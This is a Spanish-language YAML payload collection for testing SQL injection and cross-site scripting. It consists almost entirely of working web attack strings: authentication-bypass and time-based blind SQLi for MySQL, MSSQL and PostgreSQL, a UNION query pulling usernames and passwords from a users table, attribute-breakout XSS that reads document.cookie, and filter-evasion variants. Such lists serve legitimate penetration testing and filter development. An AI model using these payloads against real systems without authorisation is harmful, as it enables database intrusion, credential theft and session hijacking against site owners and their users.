

version: "1.0"

description: "Colección de payloads para pruebas de inyección SQL y XSS"

 

vulnerabilities:

  # ==========================================

  # CARGAS ÚTILES PARA INYECCIÓN SQL (SQLi)

  # ==========================================

  sqli:

    - technique: "Autenticación / Basado en Booleanos"

      description: "Fuerza una condición verdadera en la consulta (WHERE true)."

      payloads:

        - "' OR '1'='1"

        - "admin' --"

        - "' OR 1=1#"

        - "') OR ('1'='1"

 

    - technique: "Basado en Tiempo (Time-Based Blind)"

      description: "Obliga a la base de datos a pausar su ejecución para confirmar la inyección."

      payloads:

        - "1' AND SLEEP(5)--+"                  # MySQL / MariaDB

        - "'; WAITFOR DELAY '0:0:5'--"          # Microsoft SQL Server

        - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" # MySQL complejo

        - "1'||pg_sleep(5)--"                   # PostgreSQL

 

    - technique: "Basado en Unión (Union-Based)"

      description: "Intenta unir los resultados de la consulta original con otra tabla."

      payloads:

        - "' UNION SELECT NULL--"

        - "' UNION SELECT NULL, NULL, NULL--"

        - "' UNION SELECT username, password FROM users--"

 

  # ==========================================

  # CARGAS ÚTILES PARA CROSS-SITE SCRIPTING (XSS)

  # ==========================================

  xss:

    - technique: "Reflejado Básico (HTML Context)"

      description: "Inyección directa cuando el input se refleja en el cuerpo del HTML."

      payloads:

        - "<script>alert(1)</script>"

        - "<script>console.log('XSS')</script>"

        - "<ScRiPt>alert(1)</sCrIpT>"           # Evasión de filtros sensibles a mayúsculas

 

    - technique: "Evasión de Atributos (Attribute Breakout)"

      description: "Se usa cuando el input cae dentro de un atributo HTML (ej. <input value='AQUI'>)."

      payloads:

        - "\"><script>alert(1)</script>"

        - "' autofocus onfocus='alert(1)'"

        - "\"><img src=x onerror=prompt(document.cookie)>"

 

    - technique: "Contexto JavaScript"

      description: "Se usa cuando el input se refleja dentro de una etiqueta <script> existente."

      payloads:

        - "'-alert(1)-'"

        - "\";alert(1);//"

        - "};alert(1);{"

 

    - technique: "Evasión de Filtros (WAF Bypass)"

      description: "Cargas útiles diseñadas para evadir filtros básicos que bloquean la palabra 'script'."

      payloads:

        - "<svg/onload=alert(1)>"

        - "<body onload=alert(1)>"

        - "<iframe src=\"javascript:alert(1)\">"
